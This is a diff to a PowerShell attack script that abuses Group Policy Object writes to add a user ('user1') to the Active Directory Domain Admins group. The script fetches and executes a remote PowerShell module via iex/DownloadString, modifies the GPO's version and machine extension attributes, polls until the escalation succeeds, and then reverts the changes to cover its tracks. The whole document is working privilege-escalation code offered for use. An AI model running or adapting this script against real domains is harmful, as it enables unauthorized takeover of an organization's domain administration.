@@ -1,6 +1,13 @@
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 iex(New-Object Net.Webclient).DownloadString("https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1")
 Import-ActiveDirectory
+$mod = (Get-Module | select Name -ExpandProperty Name | findstr /i activedirectory)
+if(($mod.Contains("dynamic_code")) -eq "True"){
+    $null
+} else {
+    echo "[-] ActiveDirectory module failed to load!"
+    exit(0)
+}
 $guid = Read-Host "Enter GPO GUID (with {})"
 $guid2 = "{"+$guid+"}"
 $domain = (Get-ADDomain).Forest
@@ -56,7 +63,6 @@ foreach ($s in $gptIniContent) {
         $num = ($s -split "=")[1]
         $ver = [Convert]::ToInt32($num)
         $newVer = $ver + 1
-        Write-Host $newver
         (Get-Content $gptIniFilePath) | ForEach-Object {$_ -replace "$ver","$newver" } |
             Set-Content -Encoding $encoding $gptIniFilePath -Force
     }
@@ -76,16 +82,30 @@ if($noext -ne 1){
 echo "[+] Adding Extensions to the attribute"
 Set-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name gPCmachineExtensionNames -Value $Ext$InitialExtensions
 $FinalizedGPO = (Get-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name gPCMachineExtensionNames | Select-Object gPCMachineExtensionNames -ExpandProperty gPCMachineExtensionNames)
-if($FinalizedGPO.StartsWith("[{00000000")){echo "[+] Successfully written extensions to GPO!"}else{echo "[-] Nothing worked nevermind"}
+if($FinalizedGPO.StartsWith("[{00000000")){
+    echo "[+] Successfully written extensions to GPO!"
+} else {
+    echo "[-] Failed to write gPCMachineExtensionNames!"
+    exit(0)
+}
 echo "`n`n"
+for ($x = 1; $x -le 300; $x++ ){
+    $PercentCompleted = ($x/300*100)
+    Write-Progress -Activity "Waiting for GPO update on the DC..." -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
+    Start-Sleep -Seconds 1
+    if ((Get-ADGroupMember "Domain Admins" | findstr user1) -ne $null) {
+        break
+    }
+}
 $timepassed = 0
 while((Get-ADGroupMember "Domain Admins" | findstr user1) -eq $null){
-    echo "Waiting for user to be added to the domain admins group."
-    sleep 5; $timepassed+=5; echo "$timepassed seconds passed"
+    sleep 1
     }
-
 echo "`n`n"
 echo "[+] User added to the domain admins group!"
+echo "`n`n"
+net group "domain admins" /dom
+echo "`n`n"
 echo "[+] Reverting extensions back to what they were"
 if($noext -ne 1){
 Set-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name gPCmachineExtensionNames -Value "$InitialExtensions"
